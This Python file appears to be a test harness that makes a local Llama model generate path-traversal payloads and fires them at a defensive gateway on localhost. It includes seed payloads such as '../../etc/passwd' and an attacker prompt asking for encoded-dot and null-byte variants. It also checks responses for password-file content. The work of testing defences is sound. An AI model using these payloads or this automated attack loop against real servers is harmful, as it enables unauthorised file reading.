"""
Component C: LLM-Driven Attacker Agent (attacker_agent.py)
Powered by local Ollama (llama3.2:3b) to dynamically reason, generate, 
and test URL interpretation payloads against the gateway, tracking complete statistics.
"""

import time
import json
import httpx
import ollama
from rich.console import Console
from rich.panel import Panel

console = Console()

GATEWAY_URL = "http://127.0.0.1:8000/api/v1/download"
MODEL_NAME = "llama3.2:3b"

INITIAL_PAYLOADS = [
    "reports/summary.pdf",
    "../../etc/passwd",
    "admin/config.json"
]

def query_ollama_for_payload(history: list) -> str:
    prompt = (
        "You are an offensive security researcher testing an AI defensive web gateway. "
        "Your goal is to test boundary conditions, path traversal variations (e.g., encoded dots, null bytes), "
        "and unauthorized route probing against an endpoint: /api/v1/download?file=<payload>.\n\n"
        f"Previous attack history and responses:\n{json.dumps(history, indent=2)}\n\n"
        "Provide ONLY the next single raw string value for the 'file' parameter to test. "
        "Do not include markdown formatting, explanations, or extra text. Just output the payload string."
    )
    
    try:
        response = ollama.chat(
            model=MODEL_NAME,
            messages=[{"role": "user", "content": prompt}],
            options={"temperature": 0.7}
        )
        payload = response['message']['content'].strip().strip('"').strip("'")
        return payload
    except Exception as e:
        console.print(f"[bold red][LLM ERROR] Ollama failed to generate payload: {e}[/bold red]")
        return "../../etc/passwd"

def run_llm_attacker_simulation():
    console.print(f"[bold magenta][ATTACKER] Initializing LLM Attacker Agent via Ollama ({MODEL_NAME})...[/bold magenta]")
    
    stats = {
        "total_attacks": 0,
        "successful_bypasses": 0,
        "blocked_attempts": 0,
        "errors": 0,
        "total_latency_ms": 0.0
    }
    
    attack_history = []
    
    for step in range(1, 6):
        stats["total_attacks"] += 1
        
        if step <= len(INITIAL_PAYLOADS):
            payload = INITIAL_PAYLOADS[step - 1]
            console.print(f"\n[yellow][ATTACKER] Step {step} | Seed Payload: {payload}[/yellow]")
        else:
            console.print(f"\n[cyan][ATTACKER] Step {step} | Querying Ollama ({MODEL_NAME}) for adaptive variant...[/cyan]")
            payload = query_ollama_for_payload(attack_history)
            console.print(f"[yellow][ATTACKER] LLM Generated Payload: {payload}[/yellow]")
        
        target_endpoint = f"{GATEWAY_URL}?file={payload}"
        start_time = time.perf_counter()
        
        try:
            response = httpx.get(target_endpoint, timeout=5.0)
            elapsed_ms = (time.perf_counter() - start_time) * 1000
            stats["total_latency_ms"] += elapsed_ms
            
            result_entry = {
                "step": step,
                "payload": payload,
                "status_code": response.status_code,
                "response_snippet": response.text[:150]
            }
            attack_history.append(result_entry)
            
            if response.status_code == 200:
                stats["successful_bypasses"] += 1
                console.print(f"[bold green][ATTACKER SUCCESS] Gateway bypassed! Status: 200 OK | Latency: {elapsed_ms:.2f}ms[/bold green]")
                if "root:" in response.text or "CONFIDENTIAL" in response.text:
                    console.print(f"[bold red][EXFILTRATION SUCCESS] Sensitive data successfully harvested from target: {response.text[:80].strip()}...[/bold red]")
                else:
                    console.print(f"[dim]Data snippet: {response.text[:100]}...[/dim]")
            elif response.status_code == 403:
                stats["blocked_attempts"] += 1
                console.print(f"[bold red][DEFENSE SUCCESS] Gateway blocked payload! Status: 403 Forbidden | Latency: {elapsed_ms:.2f}ms[/bold red]")
                try:
                    data = response.json()
                    console.print(f"[dim]Block Reason: {data.get('reason')} | Gateway Inspection Latency: {data.get('latency_ms')}ms[/dim]")
                except Exception:
                    pass
            else:
                stats["errors"] += 1
                console.print(f"[yellow][INFO] Status code: {response.status_code} | Latency: {elapsed_ms:.2f}ms[/yellow]")
                
        except httpx.RequestError as exc:
            stats["errors"] += 1
            console.print(f"[bold red][ERROR] Connection failed: {exc}[/bold red]")
            
        time.sleep(2.0)

    avg_latency = stats["total_latency_ms"] / stats["total_attacks"] if stats["total_attacks"] > 0 else 0
    block_percentage = (stats["blocked_attempts"] / stats["total_attacks"]) * 100 if stats["total_attacks"] > 0 else 0

    report = (
        f"[cyan]Total Autonomous Probes:[/cyan] {stats['total_attacks']}\n"
        f"[red]Blocked by Defensive Gateway:[/red] {stats['blocked_attempts']} ({block_percentage:.1f}% Defense Efficacy)\n"
        f"[green]Successful Bypasses:[/green] {stats['successful_bypasses']}\n"
        f"[yellow]Errors / Timeouts:[/yellow] {stats['errors']}\n"
        f"[magenta]Average Round-Trip Latency:[/magenta] {avg_latency:.2f} ms"
    )
    
    console.print(Panel(report, title="📊 LLM Attacker Agent Statistical Summary Report", expand=False))

if __name__ == "__main__":
    run_llm_attacker_simulation()
    #curl "http://127.0.0.1:8000/admin/toggle-security?enable=true"